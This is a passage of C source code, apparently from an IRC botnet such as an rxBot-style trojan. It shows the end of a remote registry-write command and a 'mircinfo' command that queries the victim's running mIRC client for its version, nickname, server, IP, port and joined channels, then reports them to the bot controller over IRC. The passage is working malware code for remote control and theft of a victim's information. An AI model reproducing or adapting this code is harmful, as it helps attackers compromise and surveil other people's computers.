						irc->privmsg(hostd->target,"%s Successfully wrote: %s\\%s\\%s (%d)",reg_title,a[3],subkey,name,atoi(a[6]));
				}
				else
				{
					if (!switches.silent)
						irc->privmsg(hostd->target,"%s Failed to write: %s\\%s\\%s (%d)",reg_title,a[3],subkey,name,atoi(a[6]));
				}
			}
		}
		return 1;
	}
#endif // NO_REGCTRL
	
#ifndef NO_MIRCINFO
	else if (!lstrcmpi("mircinfo",a[0]) || !lstrcmpi("minfo",a[0]))
	{
		HWND mwnd = fFindWindow("mIRC", NULL);
		if (mwnd)
		{
			HANDLE hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE,0,PAGE_READWRITE,0,4096,"mIRC");
			LPSTR mData = (LPSTR)MapViewOfFile(hFileMap,FILE_MAP_ALL_ACCESS,0,0,0);
			char mircversion[16], mircnick[MAX_NICKLEN], ircserver[MAX_HOSTNAME], ircserverip[MAX_IP], ircport[8], channels[IRCLINE];

			// mirc version
			ZeroMemory(mircversion,sizeof(mircversion));
			sprintf(mData,"$version");
			fSendMessage(mwnd, WM_USER + 201, 1, 0);
			_snprintf(mircversion,sizeof(mircversion),"%s", mData);

			// mirc nick
			ZeroMemory(mircnick,sizeof(mircnick));
			sprintf(mData,"$me");
			fSendMessage(mwnd, WM_USER + 201, 1, 0);
			_snprintf(mircnick,sizeof(mircnick),"%s", mData);

			// irc server
			ZeroMemory(ircserver,sizeof(ircserver));
			sprintf(mData,"$server");
			fSendMessage(mwnd, WM_USER + 201, 1, 0);
			_snprintf(ircserver,sizeof(ircserver),"%s", mData);

			// irc serverip
			ZeroMemory(ircserverip,sizeof(ircserverip));
			sprintf(mData,"$serverip");
			fSendMessage(mwnd, WM_USER + 201, 1, 0);
			_snprintf(ircserverip,sizeof(ircserverip),"%s", mData);

			// irc port
			ZeroMemory(ircport,sizeof(ircport));
			sprintf(mData, "$port");
			fSendMessage(mwnd, WM_USER + 201, 1, 0);
			_snprintf(ircport,sizeof(ircport),"%s", mData);

			// channels
			ZeroMemory(channels,sizeof(channels));
			char numchans[16];
			sprintf(mData,"$chan(0)");
			fSendMessage(mwnd,WM_USER + 201,1,0);
			_snprintf(numchans,sizeof(numchans),mData);
			for (int i=1;i <= atoi(numchans);i++) {
				sprintf(mData,"$chan(%i)",i);
				fSendMessage(mwnd,WM_USER + 201,1,0);
 				strcat(channels,mData);
 				if (i < atoi(numchans)) strcat(channels,", ");
				if (i == atoi(numchans)) strcat(channels,".");
			}

			irc->privmsg(hostd->target,"%s User is running mIRC %s, connected to %s (%s:%s) using the nick: %s, on channels: %s", mirc_title, mircversion, ircserver, ircserverip, ircport, mircnick, channels);
			UnmapViewOfFile(mData);
			CloseHandle(hFileMap);
		}
		else
			if (!switches.silent)
				irc->privmsg(hostd->target,"%s Client not open.",mirc_title);

		return 1;
	}
#endif

	return 0;
}
